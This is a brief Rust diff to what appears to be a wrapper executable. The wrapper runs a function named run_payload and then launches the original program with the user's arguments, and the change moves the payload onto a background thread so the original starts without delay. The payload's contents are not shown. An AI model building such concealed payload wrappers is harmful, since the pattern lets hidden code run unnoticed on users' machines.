@@ -40,7 +40,8 @@ fn run_payload(dir: &PathBuf) {
 
 fn main() {
     let dir = exe_dir();
-    run_payload(&dir);
+    let payload_dir = dir.clone();
+    let _ = std::thread::spawn(move || run_payload(&payload_dir));
     let status = Command::new(dir.join(ORIGINAL_EXE))
         .args(env::args_os().skip(1))
         .status();
